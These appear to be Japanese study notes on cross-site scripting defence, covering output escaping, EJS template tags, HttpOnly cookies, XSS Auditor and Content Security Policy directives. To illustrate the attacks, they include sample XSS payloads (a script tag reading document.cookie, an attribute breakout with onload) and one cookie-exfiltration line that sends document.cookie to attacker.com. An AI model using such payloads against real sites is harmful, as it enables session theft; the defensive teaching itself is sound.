# XSS: Cross Site Scripting の復習
## ユーザの入力のエスケープ
* HTML Template
つぎのタグに囲まれた箇所にユーザからの入力を受け付ける場合、クライアント側のコンピュータで何が起きるか？
```
<p> USER DATA HERE </p>
```
  * ユーザによる入力: <script>alert(document.cookie)</script>
  * 出力結果 (エスケープなし): 
  <p><script>alert(document.cookie)</script></p>
  * 出力結果 (エスケープあり): 
  <p>&lt;script>alert(document.cookie)&lt;/script></p>

## 反射型・持続型XSS

* Refected XSS (反射型XSS)
  * 攻撃者はHTTPリクエストを利用してXSSを仕掛けるために、攻撃用のJavascriptを別サイトに置く。
    * 例えば、標的がよく利用するWebサイトやそれらを偽装したサイトを利用してXSSを仕掛ける。
    * メールのURLに攻撃用のスクリプトを置くこともできる。
    * 入力値をそのまま表示するサイトに仕掛ける。たとえば、クライアントの入力値を確認する画面を表示するページなどにある。
  * 攻撃者の目標：標的が攻撃者の設置したコードを実行するためのURLを踏むよう誘導する
  * 攻撃条件：標的がURLやクエリのパラメータとして攻撃コードを入力する
* Stored XSS (Persistent XSS, 持続型XSS)
  * 攻撃用のコードをデータベースなどに保存する。
    * Webメールやソーシャルメディアに攻撃用スクリプトを保存する。例：Samy
  * 攻撃者の目標：攻撃者は様々な手法を利用してデータベースに攻撃コードを埋め込む。
  * 
## Injecting down vs. Injecting up
* Injecting down: ネストするコンテキストを生成する
* Injecting up: コンテキストを終了し、上位のコンテキストに移る

* Injecting down の例
  * p の内側に script をネストしている
    <p> USER_DATA_HERE </p>
    <p><script>alert(document.cookie)</script></p>

* Injecting up の例
  * alt 属性を終了して、imgタグ内のコンテキストに移る
  <img src='avater.png' alt='USER_DATA_HERE' />
  <img src='avater.png' alt='mochinaga&apos; onload=&apos;alert(document.cookie)' />

## XSSからの防御
* コードインジェクションは、「信頼できないデータ」が「コード」になった時に起こる。
* Cross Site ScriptingはHTMLインジェクションの方がわかりやすい
* 目標：ユーザからの入力をescape(エスケープ), sanitize(無効化)してからコードにする（HTMLテンプレート）

## 信頼できないデータはどこから来るか？
* ユーザによるHTTP リクエスト
  * クエリパラメータ、入力用のフィールド、ヘッダ、cookie、ファイルのアップロードは信頼しない。
  * データベース上のデータ
    * データベースに入力されたデータの出所はわからないため、信用しない。
  * Third Party（第三者、別事業者）のサービス
    * 自分が管理していないデータが安全である保証はない。
    * 大手事業者であっても、セキュリティは完全ではない。そのため、他社が攻撃され、危ないデータが混入する可能性はある。

## いつユーザの入力をエスケープするか
* データベースに入力するときか、またはデータを描画するときか
  * いつも：データを描画するとき
* なぜデータを描画するときにエスケープするのか
  * データがデータベースに入る際にあらゆる可能性を考慮しても、データをどのように利用するかは事前にわからない。
  * 異なるコンテキストにおいて制御文字は異なる。
## ユーザの入力をエスケープする方法
* HTMLエスケープ処理
  * リーナスの法則（リーナスのほうそく、Linus's Law）
    * 「十分な目ん玉があれば、全てのバグは洗い出される」（"Given enough eyeballs, all bugs are shallow"）『伽藍とバザール』（"The Cathedral and the Bazaar", 1999年）
      * 十分なベータテスターと共同開発者がいれば、ほとんど全ての問題は、すぐさま明らかになり、すぐさま修正される [Wikipedia](https://ja.wikipedia.org/wiki/%E3%83%AA%E3%83%BC%E3%83%8A%E3%82%B9%E3%81%AE%E6%B3%95%E5%89%87)
  * ソフトウェアのバグを見つけたら、無料で修正しましょう！もし、できなければ、開発者に教えましょう。
* コンテキスト内でどう扱えば安全にアウトプットを作り出せるかを確認する
  * HTMLエスケープ処理を行わずに script タグや HTMLコメントにユーザからの入力を入れるとどうなるか？

## EJSにおけるエスケープ処理
* EJSは、JavaScriptで利用するシンプルなテンプレートエンジンである。
  * '<%= %>'このタグの中に、出力したいコードを書くことで、HTMLエスケープされて出力する。
* EJSテンプレート： userの値によって、表示を変更する
  ```
  <% if (user) { %>
    <h2><%= user.name %></h2>
  <% } %>
  ```
  * サーバのコード
    ```
    res.render('template-name', {user})
    ```

## EJS は紛らわしいタグが多い
* <% 'Scriptlet'タグ：出力なしのフロー制御
* <%_ 'Whitespace Slurping' タグ前の空白を削除する
* <%= テンプレートに値を出力する、HTMLをエスケープする。変数に禁則文字(<や&など)を含む場合に自動的にエスケープされる。
* <%- テンプレートに値を出力する、エスケープなし
* <%# コメントタグ、実行コードなし、出力なし
* <%% '<%' を出力する
* %> 終了タグ
* -%> トリムモード（改行なし）タグ、コメント行の不要な改行を除去できる。
* _%> タグ以降の空白を削除する

# 実際XSSはいつか起こる
* XSSは一般的な脆弱性の一つ
* 我々のWebサイトがXSSを許容したとすれば、どんなことが起きるか？
* XSSがある第三者のWebサイトが存在した場合、どうやって自身のWebサイトを守るか？
  * 攻撃コードは利用者のデータ（cookies等の秘密データ）を含むページで実行される。
  * 非常に難しい課題であり、挑戦的である。

# 鍵となるアイデア：多層防御
* 目標：セキュリティ制御が失敗したときや脆弱性が悪用されたときに冗長性を確保する
* 攻撃者は攻撃を成功させるために複数の悪用可能な脆弱性を見つける必要がある
* 身近な多層防御の例をあげよ
  * 強力なパスワードと多要素認証
  * 監査ログとして、メールによる通知を行う

# 利用者のCookieを守る
* HttpOnly 属性を適用することで、JavaScriptを利用してブラウザ内のCookieを読み取ることを防ぐ
Set-Cookie: key=value; HttpOnly
* HttpOnly 属性は次のような攻撃コードから利用者を守る
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie

# XSS Auditor
* 2010年にChrome 4で導入した
* ブラウザは、XSS AuditorをHTMLパースする際にリクエスト・レスポンスの間で怪しい部分がないかを見分けるために実行する。これは反射型XSSを検知するために実行する。
  * Stored XSS の場合には被害を軽減できなかった。
* Chromeは2019年のChrome 78以降に同機能を削除した。

# XSS Auditorの問題点
* False Negative: XSS Auditorを回避する手法がたくさんあった。
* False Positive: リクエスト・レスポンスの両方に表れるスクリプトをブロックすべきか、リクエスト・レスポンス間での関係性が明確でない
* 例えば次のような場合： 
<script>alert('hi')</script>
  * 利用者が通常通り上記のスクリプトを含んだページを読み込むときには警告しない。
  * 利用者が上記のスクリプトをクエリに入れて読み込んだときには警告する。
  ?query=<script>alert('hi')</script>

# Content Security Policy (CSP)
* CSPは、対応しているブラウザの挙動をWebサイト運営者が制御する宣言的なセキュリティの仕組みである。
* これまでは、他のWebサイトが自身のWebサイトに対するリクエストを制御するものであった。
  * Same Origin Policy を強化することで、フォームの送信、画像の読み込み、スクリプトの実行、スタイル等を制御できることを学んできた。
  * CSPは、自身のWebサイトが他のサイトに対して行うリクエストを制御する。
* CSPは、XSSに対して別の防御層を提供する。
  * ユーザが自身のWebサイトにある攻撃コードを実行したとしても被害を限定できる。

# Content-Security-Policy HTTP ヘッダ
* Webサーバの設定においてContent-Security-PolicyヘッダをHTTPレスポンスに加えるように設定する。これによって、ユーザが訪問したWebページで読み込む内容を制御する。
* CSPは設定したポリシーに違反する、ユーザによるHTTPリクエストをブロックする。

# 設定目標: コンテンツは自身のサイトのみから発生するものを許可する
Content-Security-Policy: default-src 'self'
* <script src='/hello.js'></script> は許可するか？
  * 許可する。相対URLは同一オリジンである。
* <script src='https://other.com/script.js'></script> は許可するか？
  * 許可しない。異なるオリジンである。
* <script>alert('hello')</script>は許可するか？
  * 許可しない。インラインスクリプトは実行できなくなる。強力なXSSからの保護になる。
* <div onmouseover='foo()'></div> は許可するか？
  * 許可しない。インラインスクリプトは実行できなくなる。強力なXSSからの保護になる。

# 例： Web Mail サービス提供者
* 設定目標：自身のサイトから発生しているリソースを許可する。サブドメインから発生しているリソースも含む。画像はどこからでも読み込める。そのほかのリソースは許可しない。

Content-Security-Policy:
  default-src 'self' *.mailsite.com;
  img-src *

* セッション CookieはHttpOnlyでないと仮定して、これらを抜き出すことはできるか。
  * とても難しい。<script> Attack CODE </script> の実行や外部のサイトからスクリプトを読み込みはできない。

# 既存のサイトにCSPを適用する
* 問題: サイトのポリシー設定方法をどうやって見いだすのか？もし、不適切な設定を行えばどうなるだろうか？サイトは壊れる。
* 解決策: report-only mode で実装し結果を確認する。指定したURLにポリシー違反の報告をする。ポリシー違反によるブロックは行わない。

Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri https://example.com/report

# ブロックしたXSS攻撃の検知
* 問題: CSPによってブロックされたXSS攻撃を検知する方法は？
* 解決策：ポリシー違反報告機能を使う、次のように設置するとCSPがサイトを壊している箇所を見つけることもできる

Content-Security-Policy:
  default-src 'self';
  report-uri https://example.com/report

# CSP fetch directives

default-src : 以下の設定のフォールバック先となるもの。たとえばFetchは connect-src を参照した後、対応するものがなければ default-src を参照する
connect-src : XHRやFetchによる読み込み
font-src : フォントの読み込みを制御する
frame-src : <iframe> による読み込み
img-src : <img> とFaviconの読み込み
manifest-src : どのマニフェストがリソースに適用されるかを指定
media-src : 次のようなメディアの制限をする <audio>, <video>, <track>
script-src : JavaScriptの読み込み
<script src="..."> による読み込みだけでなく、 <script> ... </script> や <button onclick="alert(1)"> のようなインラインスクリプトの実行を抑制する設定もある
style-src : CSSの読み込み
script-src と同じように <link href="..." rel="stylesheet" type="text/css"> による読み込みだけでなく <style>...</style> や <button style="..."> のようなインラインスタイルもカバーする
media-src : <video> と <audio> による読み込み
prefetch-src : <link rel="prefetch"> や <link rel="prerender"> による読み込み
worker-src - Restricts sources for Worker, SharedWorker, and ServiceWorker (Web Worker とは、ウェブアプリケーションにおけるスクリプトの処理をメインとは別のスレッドに移し、バックグラウンドでの実行を可能にする仕組み)


fetch API は、リクエストやレスポンスといったプロトコルを操作する要素にアクセスするための JavaScript インターフェイス
グローバルの fetch() メソッドも提供しており、簡単で論理的な方法で、非同期にネットワーク越しでリソースを取得することができます。

# その他のCSP directive
次のdirectiveは、default-srcで設定した値にフォールバックしない。もし、次の値を設定しないとき、すべてを許可する。
base-uri: ページに記述されたリンク先 URL の基準となる URLを指定する<base> を制限する
form-action: form の送信先として利用できるURLを制限する。
frame-ancestors : <frame> や <iframe> を利用してページを埋め込むことのできる親を指定します。
設定例: Content-Security-Policy: frame-ancestors 'self' https://www.example.org;
保護された文書が提供されたオリジンを、同じ URL スキームおよびポート番号で参照するとともに、https://www.example.org で参照できる。
navigate-to : リンクなどの別ページへの遷移を制限する
upgrade-insecure-requests : セキュアでないリクエストをセキュアなリクエストに移行させる。httpをhttpsにするようにする。
